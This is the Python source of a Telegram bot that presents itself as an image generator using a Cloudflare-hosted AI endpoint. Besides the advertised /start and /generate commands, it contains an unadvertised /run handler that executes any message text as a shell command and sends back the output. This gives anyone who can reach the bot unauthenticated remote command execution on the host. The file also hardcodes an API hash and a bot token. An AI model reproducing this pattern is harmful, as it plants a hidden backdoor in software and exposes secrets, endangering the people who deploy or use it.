from pyrogram import Client, filters
from pyrogram.types import Message
import requests
import subprocess

api_id = 9907811  
api_hash = "b5adb7f7d4a096750edec1bc6daacd56"
token = "6742979290:AAEG4tb6-AYNGSur-SasXzBrOxRny21m2ao"
bot = Client("isit bot", api_id=api_id, api_hash=api_hash, bot_token=token)

@bot.on_message(filters.command("start"))
async def hello(_, msg):
    firstname = msg.from_user.first_name
    startmsg = f"""ʜᴇʏ,{firstname}! ʜᴏᴡ ᴄᴀɴ ɪ ᴀꜱꜱɪꜱᴛ ʏᴏᴜ ᴛᴏᴅᴀʏ?
 ɪ ᴀᴍ ᴀ ᴛᴇʟᴇɢʀᴀᴍ ʙᴏᴛ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ɪᴍᴀɢᴇꜱ ᴡɪᴛʜ ᴛʜᴇ ʜᴇʟᴘ ᴏꜰ ᴄʟᴏᴜᴅꜰʟᴀʀᴇ'ꜱ ꜱᴇʀᴠᴇʀʟᴇꜱꜱ ᴍᴏᴅᴇʟꜱ

ᴜꜱᴀɢᴇ: /generate <prompt>"""
    await bot.send_message(msg.chat.id,startmsg)

@bot.on_message(filters.command('generate'))
async def whomai(_, msg):
    if len(msg.command) > 1:
        # Extract the text input from the command
        print(msg.text)
        prompt = msg.text.split(maxsplit=1)[1]
        print(prompt)
        await bot.send_message(msg.chat.id,"Requests Initiated ⚡️\nwait for a moment")
        await bot.send_sticker(msg.chat.id,"CAACAgIAAxkBAAEL-zBmKQFuuFTgJyns7oXykZdkaaHiPAACPgIAAiHtuwPNMjQkRQEERzQE")
        apiurl = f"https://ai.hashhackersapi.workers.dev/genImage5.png?text={prompt}"
        response = requests.get(apiurl)
        if response.status_code == 200:
            image_data = response.content
            file_path = 'aiimage.jpg' 
            with open("aiimage.jpg", 'wb') as data:
                data.write(image_data)
            await bot.send_photo(msg.chat.id, photo=file_path)
        else:
            await bot.send_message(chat_id=msg.chat.id, text="Failed to generate image.")
            
@bot.on_message(filters.command("run"))
def run_command(client, message):
    # Extract the command from the message
    command = message.text.split(maxsplit=1)[1]

    # Execute the command
    output = subprocess.getoutput(command)

    # Check if the output is too big
    if len(output) > 4096:
        # If too big, write to a text file and send
        with open("output.txt", "w") as f:
            f.write(output)
        client.send_document(
            chat_id=message.chat.id,
            document="output.txt",
            caption="Output is too big, sending as a file."
        )
        # Delete the temporary file
        os.remove("output.txt")
    else:
        # If not too big, send the output directly
        message.reply_text(output)
bot.run()
